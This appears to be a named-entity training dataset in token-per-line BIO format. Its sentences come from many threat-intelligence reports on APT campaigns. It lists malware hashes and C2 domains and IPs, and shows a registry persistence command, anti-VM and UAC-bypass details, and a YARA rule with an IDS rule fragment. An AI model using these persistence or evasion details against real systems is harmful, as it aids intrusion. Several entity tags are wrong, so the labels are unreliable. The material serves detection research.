by	O
one	O
of	O
the	O
most	O
fascinating	O
groups	O
operating	O
in	O
Asia	O
.	O

2016	O
.	O

Thus	O
,	O
there	O
is	O
a	O
pressing	O
need	O
to	O
detect	O
and	O
address	O
threats	O
via	O
a	O
proactive	O
incident	O
response	O
strategy	O
.	O

All	O
of	O
the	O
samples	O
Cylance	O
identified	O
were	O
compiled	O
in	O
November	O
2016	O
,	O
so	O
these	O
backdoors	O
may	O
have	O
simply	O
been	O
tests	O
as	O
later	O
samples	O
moved	O
back	O
to	O
the	O
shellcode-based	O
Ham	B-malware.backdoor
Backdoors	I-malware.backdoor
.	O

Because	O
of	O
this	O
,	O
the	O
allocated	O
heaps	O
will	O
not	O
be	O
freed	O
.	O

'upnphost.exe	O
'	O

News	O
of	O
the	O
attack	O
and	O
subsequent	O
death	O
of	O
Sarabjit	O
Singh	O
incited	O
protests	O
in	O
India	O
that	O
increased	O
regional	O
Indo-Pakistani	O
tensions	O
and	O
served	O
as	O
a	O
catalyst	O
for	O
bilateral	O
governmental	O
negotiations	O
between	O
Delhi	O
and	O
Islamabad	O
.	O

Version	O
5.0	O

One	O
of	O
the	O
reasons	O
for	O
this	O
big	O
difference	O
in	O
file	O
size	O
is	O
that	O
only	O
one	O
of	O
the	O
exported	O
functions	O
of	O
the	O
backdoor	O
DLL	O
contains	O
the	O
malicious	O
code	O
.	O

This	O
,	O
however	O
,	O
is	O
not	O
the	O
case	O
while	O
the	O
RAT	O
is	O
injected	O
into	O
a	O
legitimate	O
host	O
process	O
.	O

Mobile	O
malware	O
continues	O
to	O
be	O
deployed	O
and	O
the	O
group	O
has	O
made	O
some	O
modi cations	O
to	O
its	O
Android	O
malware	O
.	O

'	O
prst.cab	O
'	O
maintains	O
an	O
encrypted	O
list	O
of	O
programs	O
that	O
maintain	O
encrypted	O
connections	O
.	O

After	O
our	O
announcement	O
in	O
January	O
2013	O
,	O
the	O
RedOctober	B-malware.unknown
operation	O
was	O
promptly	O
shut	O
down	O
and	O
the	O
network	O
of	O
C	O
&	O
Cs	O
was	O
dismantled	O
.	O

Example	O
1	O
:	O
PowerShell	O
payload	O
with	O
embedded	O
Shellcode	O
downloading	O
Cobalt	O
Strike	O
Beacon	O

Internal	O
name	O
:	O
loadCryptRunner.dll	O
Compiled	O
:	O
Mon	O
Dec	O
12	O
10:09:15	O
2016	O
Responsible	O
for	O
persistency	O
and	O
executing	O
the	O
downloader	O
DLL	O
,	O
the	O
Stage	O
1	O
Dropper	O
registers	O
itself	O
in	O
the	O
registry	O
under	O
the	O
key	O
:	O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\drvpath	O
RUNDLL32	O
'	O
%	O
USERPROFILE	O
%	O
\AppData\Roaming\Microsoft\VSA\klnihw22.nlp	O
'	O
,	O
RUNNER	O
The	O
communication	O
DLL	O
is	O
also	O
loaded	O
using	O
Reflective	O
DLL	O
Injection	O
.	O

During	O
the	O
attack	O
,	O
the	O
authors	O
introduced	O
new	O
variants	O
of	O
these	O
backdoors	O
,	O
indicating	O
'	O
on-the-fly	O
'	O
development	O
capabilities	O
.	O

This	O
behaviour	O
can	O
be	O
used	O
to	O
detect	O
if	O
the	O
targeted	O
system	O
is	O
a	O
real	O
machine	O
.	O

For	O
example	O
,	O
QQPCRTP.exe	O
and	O
QQPCTray.exe	O
are	O
from	O
a	O
messaging	O
software	O
by	O
a	O
company	O
based	O
in	O
China	O
.	O

In	O
turn	O
,	O
this	O
is	O
widely	O
believed	O
to	O
relate	O
to	O
the	O
incident	O
at	O
Anthem	O
,	O
as	O
described	O
in	O
a	O
Krebs	O
post	O
.	O

Confucius	O
'	O
operations	O
include	O
deploying	O
bespoke	O
backdoors	O
and	O
stealing	O
files	O
from	O
their	O
victim	O
's	O
systems	O
with	O
tailored	O
file	O
stealers	O
,	O
some	O
of	O
which	O
bore	O
resemblances	O
to	O
Patchwork	O
's	O
.	O

Insikt	O
Group	O
analyzed	O
internet	O
traffic	O
relating	O
to	O
various	O
institutes	O
affiliated	O
with	O
the	O
Iranian	O
cyber	O
ecosystem	O
from	O
March	O
1	O
,	O
2018	O
to	O
April	O
30	O
,	O
2018	O
.	O

Anti-VM	O
:	O
Iron	B-malware.backdoor
Backdoor	I-malware.backdoor
uses	O
a	O
virtual	O
machine	O
detection	O
code	O
taken	O
directly	O
from	O
HackingTeam	O
's	O
'	O
Soldier	O
'	O
implant	O
leaked	O
source	O
code	O
.	O

UploadFileOk	O
:	O
upload	O
a	O
file	O
to	O
the	O
compromised	O
system	O
;	O
the	O
bot	O
will	O
respond	O
with	O
a	O
message	O
with	O
the	O
header	O
$	O
fileUpload	O
$	O
.	O

Therefore	O
,	O
the	O
attackers	O
used	O
over	O
10	O
different	O
customized	O
Mimikatz	B-malware.unknown
payloads	O
,	O
which	O
were	O
obfuscated	O
and	O
packed	O
in	O
a	O
way	O
that	O
allowed	O
them	O
to	O
evade	O
antivirus	O
detection	O
.	O

McDonald	O
,	O
L.O.	O
Murchu	O
,	O
S	O
.	O

We	O
also	O
found	O
code-level	O
similarities	O
in	O
the	O
network	O
communication	O
function	O
code	O
,	O
as	O
well	O
as	O
the	O
data	O
collection	O
function	O
code	O
shown	O
in	O
Figure	O
17	O
.	O

Bloomberg	O
reports	O
that	O
various	O
US	O
intelligence	O
sources	O
have	O
labeled	O
this	O
activity	O
as	O
'	O
Byzantine	O
Candor	O
'	O
,	O
accordingly	O
.	O

All	O
backdoors	O
appear	O
to	O
be	O
compiled	O
on	O
April	O
1st	O
2013	O
,	O
suggesting	O
that	O
the	O
attacks	O
are	O
reasonably	O
recent	O
.	O

8993a516404c0dd62692f3ce5055d4ddee7e29ad4bb6aa29f67114eeeaee26b9	B-hash
bfe727f2f238f11eb989e5b76efd24ad2b41df3cf7dabf7077dfaace834e7f03	B-hash
dad34d2cb2aa9662d4a4148481ae018f5816498f30cc7aee4919e0e9fe6b9e08	B-hash
2cb9df0d52d09c98f0a97ce71eb8805f224945cadab7d615ef0257b7b09c80d3	B-hash
f53fd5389b09c6ad289736720e72392dd5f30a1f7822dbc8c7c2e2b655b4dad9	B-hash
1d533ddaefc7859a3f6c6751114e895b7aa5935eb0ed68b01ec61aa8560ae3d9	B-hash
95b2f926ae173ab45d6dac4039f0b91eb24699e6d11b621bbcebd860752e5d5e	B-hash
da63f6392ce6af83f6d944fa1bd3f28082345fec928647ee7ef9939fac7b2e6c	B-hash
a7aeeead233fcdfe1c7475db982497a82d8ae745ec1c58bd87215e8869c3f9e4	B-hash
2eb7aa306551d693691d14558c5dc4f6d80ef8f69cf466149fbba23953c08f7f	B-hash
e945b055fb4057a396506c74f73b873694125e6178a40d10cabf24b2d89d598f	B-hash
c9e084eb1ce1066ee063f860c13a8f7d2ead97495036855fc956dacc9a24ea68	B-hash
047e8d542e2fcdf0f4dd45e2b19848771d01abc90d161d05242b79c52cdd248d	B-hash
25e6bf67410dffb95c527c19dcff5223dbc3bf4c987650e45fbea1267072e8ff	B-hash
b0edbd0f44df72e0fad3fb73948444a4df5143ed954c9116eb1a7b606841f187	B-hash
da63f6392ce6af83f6d944fa1bd3f28082345fec928647ee7ef9939fac7b2e6c	B-hash
de3e25a69ba43b9f236e544ece7f2da82a4fafb4489ad2e263754d9b9d88bc5c	B-hash
ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9	B-hash
f969bf3b7a9821b3b2d5de889b5af7af25972b25ba59e4e9439f87fe90f1c404	B-hash
14be3a9a2a4261cb365915e720486a0632dbebb06fe68fb669ae67aa9b18507b	B-hash
488ba22d6cb8c9b0310c58fa4c4739692cdf45676c3164b357314322542f9dff	B-hash
b3a47e0bc0af49b46bc0c1158089bf200856ff462a5334df2b5c11e69c8b1ada	B-hash
324ce011b913feec4adb916f32c743a243f07dccb51b49c0122c4fa4a8e2bded	B-hash
d6df5943169b48ac58fc28bb665fe8800c265b65fff8a2217b70703a4d3a7277	B-hash
88e7a7e815565b92af81761ae7b9153b7507677df3d3b77e8ce68787ad1826d4	B-hash
f51d4155534e10c09b531acc41458e8ff3b7879f4ee7d3ee99f16180c4caf0ee	B-hash
b3a47e0bc0af49b46bc0c1158089bf200856ff462a5334df2b5c11e69c8b1ada	B-hash
bc846caa05939b085837057bc4b9303357602ece83dc1380191bddd1402d4a2b	B-hash
cbbnews.tk	B-url.cncsvr
haartezenglish.redirectme.net	B-url.cncsvr
wallanews.sytes.net	B-url.cncsvr
kaliob.selfip.org	B-url.cncsvr
deapka.sytes.net	B-url.cncsvr
download.likescandy.com	B-url.cncsvr
orango.redirectme.net	B-url.cncsvr
ynet.sytes.net	B-url.cncsvr
kaswer12.strangled.net	B-url.cncsvr
nazer.zapto.org	B-url.cncsvr
rotter2.sytes.net	B-url.cncsvr
kaswer13.zapto.org	B-url.cncsvr
tango.zapto.org	B-url.cncsvr
kolabdown.sytes.net	B-url.cncsvr
rotter2.publicvm.com	B-url.cncsvr
safar.selfip.com	B-url.cncsvr
bandao.publicvm.com	B-url.cncsvr
safari.linkpc.net	B-url.cncsvr
thenewupdate.chickenkiller.com	B-url.cncsvr
backjadwer.bounceme.net	B-url.cncsvr
ajaxo.zapto.org	B-url.cncsvr
downloadskype.cf	B-url.cncsvr
redirectlnk.redirectme.net	B-url.cncsvr
thenewupdatee.redirectme.net	B-url.cncsvr
chromeupdt.tk	B-url.cncsvr
duntat.zapto.org	B-url.cncsvr
ynet.ignorelist.com	B-url.cncsvr
haartezenglish.strangled.net	B-url.cncsvr
gaonsmom.redirectme.net	B-url.cncsvr
store­legal.biz	B-url.cncsvr
fastbingcom.sytes.net	B-url.cncsvr
downloadlog.linkpc.net	B-url.cncsvr
downloadmyhost.zapto.org	B-url.cncsvr
depka.sytes.net	B-url.cncsvr
wallanews.publicvm.com	B-url.cncsvr
noredirecto.redirectme.net	B-url.cncsvr
safara.sytes.net	B-url.cncsvr
help2014.linkpc.net	B-url.cncsvr
totoman.no­ip.biz	B-url.cncsvr
lilian.redirectme.net	B-url.cncsvr
webfile.myq­see.com	B-url.cncsvr
185.33.168.150	B-ip.unknown
185.45.193.4	B-ip.unknown
167.114.62.213	B-ip.unknown
131.72.136.11	B-ip.unknown
131.72.136.171	B-ip.unknown
192.253.246.169	B-ip.unknown
198.105.122.96	B-ip.unknown
131.72.136.124	B-ip.unknown
107.168.129.29	B-ip.unknown
198.105.122.9	B-ip.unknown
rule	O
DownExecute_A	O
meta	O
:	O
author	O
=	O
'	O
PwC	O
Cyber	O
Threat	O
Operations	O
:	O
:	O
@	O
tlansec	O
'	O
date	O
=	O
'	O
2015­04	O
'	O
reference	O
=	O
'	O
http://pwc.blogs.com/cyber_security_updates/2015/04/attacks­against­israeli­palestinia	O
n­interests.html	O
'	O
description	O
=	O
'	O
Malware	O
is	O
often	O
wrapped/protected	O
,	O
best	O
to	O
run	O
on	O
memory	O
'	O
strings	O
:	O
$	O
winver1	O
=	O
'	O
win	O
8.1	O
'	O
$	O
winver2	O
=	O
'	O
win	O
Server	O
2012	O
R2	O
'	O
$	O
winver3	O
=	O
'	O
win	O
Srv	O
2012	O
'	O
$	O
winver4	O
=	O
'	O
win	O
srv	O
2008	O
R2	O
'	O
$	O
winver5	O
=	O
'	O
win	O
srv	O
2008	O
'	O
$	O
winver6	O
=	O
'	O
win	O
vsta	O
'	O
$	O
winver7	O
=	O
'	O
win	O
srv	O
2003	O
R2	O
'	O
$	O
winver8	O
=	O
'	O
win	O
hm	O
srv	O
'	O
$	O
winver9	O
=	O
'	O
win	O
Strg	O
srv	O
2003	O
'	O
$	O
winver10	O
=	O
'	O
win	O
srv	O
2003	O
'	O
$	O
winver11	O
=	O
'	O
win	O
XP	O
prof	O
x64	O
edt	O
'	O
$	O
winver12	O
=	O
'	O
win	O
XP	O
'	O
$	O
winver13	O
=	O
'	O
win	O
2000	O
'	O
$	O
pdb1	O
=	O
'D	O
:	O
\\Acms\\2\\docs\\Visual	O
Studio	O
2013\\Projects\\DownloadExcute\\DownloadExcute\\Release\\DownExecute.pdb	O
'	O
$	O
pdb2	O
=	O
'd	O
:	O
\\acms\\2\\docs\\visual	O
studio	O
2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\writer.h	O
'	O
$	O
pdb3	O
=	O
'	O
:	O
\\acms\\2\\docs\\visual	O
studio	O
2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\internal/stack.h	O
'	O
$	O
pdb4	O
=	O
'	O
\\downloadexcute\\downexecute\\	O
'	O
$	O
magic1	O
=	O
'	O
<	O
Win	O
Get	O
Version	O
Info	O
Name	O
Error	O
'	O
$	O
magic2	O
=	O
'	O
P	O
@	O
$	O
sw0rd	O
$	O
nd	O
'	O
$	O
magic3	O
=	O
'	O
$	O
t	O
@	O
k0v2rF10w	O
'	O
$	O
magic4	O
=	O
'	O
|	O
*	O
|	O
123xXx	O
(	O
Mutex	O
)	O
xXx321	O
|	O
*	O
|	O
6­21­2014­03:06PM	O
'	O
wide	O
$	O
str1	O
=	O
'	O
Download	O
Excute	O
'	O
ascii	O
wide	O
fullword	O
$	O
str2	O
=	O
'	O
EncryptorFunctionPointer	O
%	O
d	O
'	O
$	O
str3	O
=	O
'	O
%	O
s\\%s.lnk	O
'	O
$	O
str4	O
=	O
'	O
Mac	O
:	O
%	O
s­Cpu	O
:	O
%	O
s­HD	O
:	O
%	O
s	O
'	O
$	O
str5	O
=	O
'	O
feed	O
back	O
responce	O
of	O
host	O
'	O
$	O
str6	O
=	O
'	O
GET	O
Token	O
at	O
host	O
'	O
$	O
str7	O
=	O
'	O
dwn	O
md5	O
err	O
'	O
condition	O
:	O
all	O
of	O
(	O
$	O
winver*	O
)	O
or	O
any	O
of	O
(	O
$	O
pdb*	O
)	O
or	O
any	O
of	O
(	O
$	O
magic*	O
)	O
or	O
2	O
of	O
(	O
$	O
str*	O
)	O
Network	O
IDS	O
alert	O
http	O
any	O
any	O
­	O
>	O
any	O
any	O
(	O
msg	O
:	O
'	O
­­	O
[	O
PwC	O
CTD	O
]	O
­­	O
Unclassified	O
Middle	O
Eastern	O
Actor	O
­	O
DownExecute	B-malware.infosteal
URI	O
(	O
/dw/gtk	O
)	O
'	O
;	O
flow	O
:	O
established	O
,	O
to_server	O
;	O
urilen:7	O
;	O
content	O
:	O
'	O
/dw/gtk	O
'	O
;	O
http_uri	O
;	O
depth:7	O
;	O
content	O
:	O
'	O
GET	O
'	O
;	O
http_method	O
;	O
content	O
:	O
!	O

HTTP	O
POST	O
Request	O

February	O
01	O
,	O
2013	O
|	O
by	O
Vinay	O
Pidathala	O
,	O
Zheng	O
Bu	O
,	O
Thoufique	O
Haq	O
,	O
Darien	O
Kindlund	O
|	O
Targeted	O
Attack	O
FireEye	O
discovered	O
an	O
APT	O
campaign	O
consistently	O
targeting	O
companies	O
in	O
the	O
aerospace	O
and	O
defense	O
industries	O
.	O

Because	O
this	O
is	O
TCP	O
traffic	O
,	O
researchers	O
can	O
'	O
follow	O
the	O
TCP	O
'	O
stream	O
in	O
Wireshark	O
,	O
a	O
popular	O
open-source	O
network-protocol	O
analyzer	O
that	O
works	O
in	O
Unix	O
and	O
Windows	O
.	O

This	O
HTTP	O
request	O
pictured	O
in	O
the	O
screenshot	O
is	O
from	O
the	O
older	O
version	O
of	O
Mutter	B-malware.backdoor
.	O

NATO	O
,	O
defense	O
industry	O
corporations	O
,	O
and	O
government	O
domains	O
of	O
states	O
opposed	O
to	O
Russia	O
on	O
various	O
issues	O
have	O
all	O
been	O
,	O
at	O
times	O
,	O
victims	O
of	O
Sofacy	O
.	O

The	O
sample	O
containing	O
this	O
video	O
is	O
digitally	O
signed	O
in	O
the	O
same	O
way	O
as	O
the	O
initial	O
samples	O
,	O
but	O
the	O
baiting	O
angle	O
is	O
different	O
.	O

This	O
approach	O
entails	O
crafting	O
campaigns	O
components	O
on­demand	O
and	O
sometimes	O
fabricating	O
entirely	O
unique	O
malicious	O
artifacts	O
.	O

A	O
200.63.46.23	B-ip.unknown

Below	O
screen	O
shot	O
shows	O
the	O
code	O
that	O
generates	O
the	O
user	O
name	O

After	O
start	O
up	O
the	O
malware	O
falls	O
into	O
a	O
loop	O
where	O
it	O
constantly	O
checks	O
for	O
the	O
journal	O
record	O
that	O
contains	O
the	O
'	O
Login	O
'	O
string	O
in	O
it	O
:	O

Except	O
for	O
version	O
3.00	O
,	O
the	O
modifications	O
made	O
are	O
rather	O
marginal	O
.	O

Sample	O
:	O
1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42	B-hash
After	O
successful	O
identification	O
of	O
the	O
malware	O
as	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
and	O
confirmation	O
of	O
the	O
modified	O
command	O
and	O
control	O
protocol	O
,	O
the	O
final	O
step	O
toward	O
verification	O
was	O
to	O
connect	O
with	O
the	O
malware	O
to	O
ensure	O
that	O
it	O
would	O
parse	O
the	O
normal	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
commands	O
.	O

Tweety	B-malware.backdoor
Chat	O
's	O
Android	O
version	O
can	O
record	O
audio	O
,	O
too	O
.	O

The	O
malware	O
will	O
use	O
this	O
extracted	O
data	O
to	O
form	O
valid	O
SQL	O
statements	O
.	O

For	O
a	O
detailed	O
analysis	O
of	O
the	O
Outlook	B-malware.backdoor
backdoor	O
,	O
please	O
see	O
the	O
Attacker	O
's	O
Arsenal	O
section	O
.	O

We	O
stumbled	O
upon	O
the	O
Confucius	O
hacking	O
group	O
while	O
delving	O
into	O
Patchwork	O
's	O
cyberespionage	B-malware.backdoor
operations	O
,	O
and	O
found	O
a	O
number	O
of	O
similarities	O
.	O

As	O
shown	O
,	O
while	O
the	O
destination	O
IP	O
is	O
'	O
8.8.8.8	O
'	O
–	O
Google	O
's	O
DNS	O
server	O
–	O
the	O
malicious	O
domain	O
is	O
'	O
hiding	O
'	O
inside	O
the	O
DNS	O
packet	O
:	O
In	O
the	O
third	O
phase	O
of	O
the	O
operation	O
,	O
the	O
attackers	O
harvested	O
credentials	O
stored	O
on	O
the	O
compromised	O
machines	O
and	O
performed	O
lateral	O
movement	O
and	O
infected	O
new	O
machines	O
.	O

The	O
file	O
on	O
the	O
hard	O
drive	O
is	O
encrypted	O
;	O
specifically	O
,	O
the	O
data	O
is	O
XORed	O
with	O
the	O
key	O
0x66	O
.	O

This	O
appears	O
to	O
be	O
an	O
attempt	O
to	O
trick	O
the	O
victim	O
into	O
believing	O
the	O
opened	O
file	O
is	O
not	O
malicious	O
.	O

According	O
to	O
an	O
opinion	O
piece	O
written	O
for	O
The	O
Hill	O
,	O
the	O
websites	O
were	O
found	O
by	O
the	O
Pentagon	O
to	O
be	O
created	O
by	O
order	O
from	O
Tehran	O
.	O

This	O
malware	O
,	O
which	O
we	O
call	O
TRITON	B-malware.infosteal
,	O
is	O
an	O
attack	O
framework	O
built	O
to	O
interact	O
with	O
Triconex	B-malware.unknown
Safety	O
Instrumented	O
System	O
(	O
SIS	O
)	O
controllers	O
.	O

Ukraine	O
Gov't	O
Websites	O
-	O
Defacements	O
and	O
DDoS	O
Russia	O
offers	O
Ukraine	O
loans	O
and	O
discounts	O
on	O
gas	O
Gazprom	O
increases	O
gas	O
prices	O
,	O
Ukraine	O
skips	O
payment	O
Intrusions	O
into	O
Ukraine	O
's	O
Transportation	O
Sector	O
DDoS	O
and	O
targeted	O
intrusions	O
in	O
media	O
,	O
financial	O
,	O
&	O
political	O
entities	O
in	O
Ukraine	O

Acknowledgements	O
.........................................................................................................................................................................................................................................................................................................	O
20	O

Figure	O
16	O
:	O
Contents	O
of	O
Malicious	O
AutoIt	O
Executable	O

Staged	O
Download	O
of	O
Flash	B-malware.drop
:	O
During	O
the	O
attack	O
chain	B-malware.backdoor
,	O
the	O
weaponized	O
document	O
loads	O
the	O
malicious	O
Flash	B-malware.backdoor
object	O
through	O
remote	O
loading	O
resulting	O
in	O
observable	O
HTTP	O
traffic	O
resulting	O
with	O
the	O
header	O
'	O
x-flash-version	O
'	O
pulling	O
a	O
secondary	O
Flash	O
object	O
(	O
Figure	O
8	O
)	O
.	O

Table	O
3	O
:	O
Time	O
stamps	O
from	O
MFT	O

Spam	O
Campaign	O
Delivers	O
Cross-platform	O
Remote	O
Access	O
Trojan	O
Adwind	O
EITest	O
Campaign	O
Uses	O
Tech	O
Support	O
Scams	O
to	O
Deliver	O
Coinhive	O
's	O
Monero	O
Miner	O
Examining	O
CVE-2017-9791	O
:	O
New	O
Apache	O
Struts	O
Remote	O
Code	O
Execution	O
Vulnerability	O
ChessMaster	O
Makes	O
its	O
Move	O
:	O
A	O
Look	O
into	O
the	O
Campaign	O
's	O
Cyberespionage	O
Arsenal	O

Whilst	O
there	O
are	O
a	O
number	O
of	O
documents	O
clearly	O
aimed	O
at	O
Israeli	O
nationals	O
,	O
using	O
political	O
and	O
military	O
themes	O
,	O
one	O
of	O
the	O
lures	O
included	O
an	O
Arabic	O
language	O
decoy	O
document	O
pictured	O
below	O
:	O
The	O
document	O
in	O
question	O
discusses	O
an	O
alleged	O
leak	O
of	O
information	O
relating	O
to	O
Abbas	O
,	O
leader	O
of	O
the	O
Palestine	O
Liberation	O
Organization	O
.	O

reporting	O
on	O
these	O
connections	O
which	O
led	O
the	O
government	O
of	O
In	O
2015	O
,	O
EFF	O
's	O
clients	O
in	O
the	O
Respublika	O
litigation	O
were	O
the	O
targets	O
of	O
several	O
spearphishing	O
attempts	O
they	O
had	O
received	O
via	O
email	O
(	O
Fig	O
.	O

What	O
is	O
most	O
interesting	O
about	O
this	O
group	O
's	O
more	O
recent	O
activity	O
however	O
,	O
is	O
their	O
focus	O
on	O
users	O
of	O
encryption	O
tools	O
,	O
peaking	O
this	O
summer	O
.	O

2	O
.	O

The	O
use	O
of	O
multiple	O
XOR	O
keys	O
and	O
string	O
stacking	O
show	O
the	O
actor	O
is	O
spending	O
great	O
effort	O
to	O
deceive	O
reverse	O
engineers	O
and	O
incident	O
responders	O
.	O

The	O
first	O
one	O
to	O
start	O
up	O
will	O
be	O
the	O
'	O
main	O
instance	O
'	O
.	O

A	O
more	O
detailed	O
analysis	O
of	O
the	O
Command-and-Control	O
communication	O
flow	O
of	O
ANEL	B-malware.backdoor
can	O
be	O
found	O
in	O
this	O
>	O
technical	O
brief	O
.	O

Svchost	O
Groups	O
registry	O
key	O
Svchost.exe	O
groups	O
are	O
identified	O
in	O
the	O
above	O
registry	O
key	O
.	O

It	O
checks	O
if	O
the	O
manufacturer	O
contains	O
'	O
VIRTUAL	O
'	O
,	O
'	O
VMWARE	O
'	O
or	O
'	O
VirtualBox	O
'	O
.	O

Next	O
,	O
the	O
file	O
establishes	O
a	O
persistence	O
mechanism	O
with	O
the	O
registry	O
key	O
:	O

This	O
is	O
an	O
unfortunate	O
vector	O
for	O
attackers	O
to	O
distribute	O
malicious	O
installers	O
and	O
bundles	O
that	O
also	O
contain	O
functional	O
versions	O
of	O
the	O
program	O
.	O

To	O
start	O
mmc.exe	O
,	O
eventvwr.exe	O
searches	O
this	O
registry	O
key	O
'	O
HKCU\Software\Classes\mscfile\shell\open\command	O
looking	O
for	O
mmc.exe	O
before	O
looking	O
at	O

-x	O
[	O
PASSWORD	O
]	O
-e	O
[	O
SERVICE_NAME	O
]	O
:	O
drop/install	O
DLL	O
under	O
specified	O
[	O
SERVICE_NAME	O
]	O
-x	O
[	O
PASSWORD	O
]	O
-f	O
[	O
SERVICE_NAME	O
]	O
:	O
recreate	O
the	O
keys	O
that	O
keep	O
the	O
password	O
for	O
the	O
next	O
stage	O
DLL	O
,	O
under	O
the	O
specified	O
[	O
SERVICE_NAME	O
]	O

The	O
attacker	O
left	O
essential	O
data	O
on	O
the	O
servers	O
,	O
such	O
as	O
emails	O
and	O
usernames	O
.	O

The	O
CopyKittens	B-malware.backdoor
attacks	O
are	O
effective	O
and	O
advanced	O
in	O
a	O
few	O
ways	O
:	O
Infecting	O
of	O
computers	O
is	O
performed	O
in	O
multi-stage	O
,	O
stealthy	O
method	O
Data	O
exfiltration	O
is	O
performed	O
over	O
DNS	O
protocol	O
They	O
avoid	O
using	O
known	O
RATs	B-malware.backdoor
and	O
packers	B-malware.backdoor
,	O
tools	O
are	O
'	O
homemade	O
'	O
Constant	O
development	O
is	O
performed	O
to	O
overcome	O
security	O
products	O
improvements	O
Yet	O
,	O
this	O
group	O
is	O
clearly	O
not	O
made	O
up	O
of	O
dozens	O
of	O
high-end	O
computer	O
and	O
security	O
experts	O
.	O

[	O
ghijklmnopabcdef	O
]	O
{	O
8	O
}	O
\	O
.	O

이	O
위협	O
그룹은	O
Aryan	O
,	O
Ghostrat	B-malware.backdoor
등	O
알려진	O
외부	O
백도어뿐만	O
아니라	O
Andarat	O
,	O
Andaratm	B-malware.backdoor
,	O
Rifdoor	B-malware.backdoor
,	O
Phandoor	B-malware.backdoor
등	O
자체	O
개발한	O
백도어도	O
사용하고	O
있다	O
.	O

Former	O
politician	O
in	O
the	O
UK.A	O
diplomat	O
the	O
European	O
Commission	O
(	O
ec.europa.eu	O
)	O
.	O

16jXkNepINeU157Xntep15zXlA==	O

The	O
domain	O
has	O
been	O
referenced	O
several	O
times	O
in	O
command	O
lines	O
,	O
e.g	O
:	O
s224.win7-update[.]com	B-url.cncsvr
s5060.win7-update[.]com	B-url.cncsvr
s21.win7-update[.]com	B-url.cncsvr
It	O
has	O
also	O
been	O
embedded	O
in	O
a	O
dropper	O
:	O
hxxp://wsus65432.win7-update[.]com	B-url.unknown
Symantec	O
also	O
discovered	O
multiple	O
IP	O
addresses	O
that	O
were	O
used	O
as	O
infrastructure	O
by	O
the	O
attackers	O
.	O

The	O
first	O
8	O
bytes	O
of	O
data	O
are	O
static	O
.	O

Hussarini	B-malware.backdoor
main	O
function	O
The	O
first	O
thread	O
acts	O
as	O
a	O
client	O
thread	O
that	O
is	O
responsible	O
for	O
communicating	O
with	O
the	O
command	O
and	O
control	O
(	O
C	O
&	O
C	O
)	O
server	O
and	O
listening	O
for	O
commands	O
.	O

This	O
report	O
details	O
our	O
observations	O
of	O
APT28	B-malware.infosteal
's	O
targeting	O
,	O
and	O
our	O
investigation	O
into	O
a	O
related	O
breach	O
.	O

Bennett	O
|	O
Threat	O
Research	O
,	O
Advanced	O
Malware	O
,	O
Targeted	O
Attack	O
FireEye	O
Labs	O
has	O
observed	O
a	O
series	O
of	O
related	O
attacks	O
against	O
a	O
dozen	O
organizations	O
in	O
the	O
aerospace	O
,	O
defense	O
,	O
and	O
telecommunications	O
industries	O
as	O
well	O
as	O
government	O
agencies	O
located	O
in	O
the	O
United	O
States	O
and	O
India	O
which	O
have	O
been	O
occurring	O
at	O
least	O
as	O
early	O
as	O
December	O
of	O
2011	O
.	O

COMMAND	O
AND	O
CONTROL	O

This	O
persistence	O
file	O
is	O
also	O
set	O
to	O
hidden	O
with	O
a	O
randomly	O
generated	O
file	O
date	O
and	O
time	O
.	O

Nachalo	O
ustanavlivat	O
poluchit	O
pereslat	O
derzhat	O
vykhodit	O
kliyent2podklyuchit	O
client	O
to	O
connect	O
to	O
maintain	O
to	O
exit	O
start	O
communication	O
session	O
handshake	O
state	O
receive	O
data	O
send	O
data	O
maintain	O
communication	O
session	O
exit	O
communication	O
session	O
client	O
is	O
ready	O
to	O
connect	O
Sample	O
#	O
6	O
(	O
splwow32.exe	O
)	O
is	O
the	O
same	O
backdoor	O
,	O
only	O
it	O
's	O
not	O
packed	O
.	O

On	O
the	O
next	O
page	O
,	O
however	O
,	O
iDefense	O
identified	O
what	O
appears	O
to	O
be	O
a	O
base64-encoded	O
string	O
.	O

Figure	O
5	O
illustrates	O
the	O
chain	O
of	O
events	O
for	O
a	O
single	O
successful	O
APT32	B-malware.infosteal
phishing	O
lure	O
that	O
dynamically	O
injects	O
two	O
multistage	O
malware	O
frameworks	O
into	O
memory	O
.	O

Trojan.PonyDOS	B-malware.unknown
,	O
however	O
,	O
adds	O
a	O
few	O
additional	O
layers	O
to	O
secure	O
its	O
communications	O
protocol	O
above	O
and	O
beyond	O
the	O
core	O
crypto	O
algorithm	O
which	O
it	O
shares	O
with	O
DarkComet	B-malware.backdoor
;	O
specifically	O
,	O
the	O
computation	O
of	O
some	O
cryptographic	O
hashes	O
.	O

We	O
have	O
chosen	O
to	O
highlight	O
two	O
attacks	O
that	O
are	O
part	O
of	O
recent	O
efforts	O
by	O
Pro-Government	O
Electronic	O
Actors	O
to	O
compromise	O
opposition	O
communications	O
and	O
steal	O
their	O
secrets	O
.	O

This	O
can	O
be	O
very	O
simple	O
,	O
and	O
but	O
still	O
can	O
be	O
very	O
annoying	O
to	O
malware	O
analysts	O
because	O
,	O
even	O
with	O
memory	O
snapshot	O
,	O
we	O
ca	O
n't	O
acquire	O
any	O
meaningful	O
strings	O
out	O
of	O
it	O
.	O

C	O
&	O
C	O
:	O

Thus	O
,	O
it	O
is	O
not	O
surprising	O
to	O
see	O
them	O
engage	O
in	O
intrusions	O
against	O
the	O
same	O
victim	O
,	O
even	O
when	O
it	O
may	O
be	O
a	O
waste	O
of	O
resources	O
and	O
lead	O
to	O
the	O
discovery	O
and	O
potential	O
compromise	O
of	O
mutual	O
operations	O
.	O

Author	O
of	O
Cobalt	O
Strike	O
:	O
Raphael	O
Mudge	O
Raphael	O
Mudge	O
is	O
the	O
founder	O
of	O
Strategic	O
Cyber	O
LLC	O
,	O
a	O
Washington	O
,	O
DC	O
based	O
company	O
that	O
creates	O
software	O
for	O
red	O
teams	O
.	O

Malware	O
delivery	O
was	O
often	O
predictable	O
,	O
contained	O
spelling	O
mistakes	O
or	O
even	O
irrelevant	O
lure	O
documents	O
,	O
and	O
were	O
easy	O
to	O
identify	O
.	O

One	O
of	O
the	O
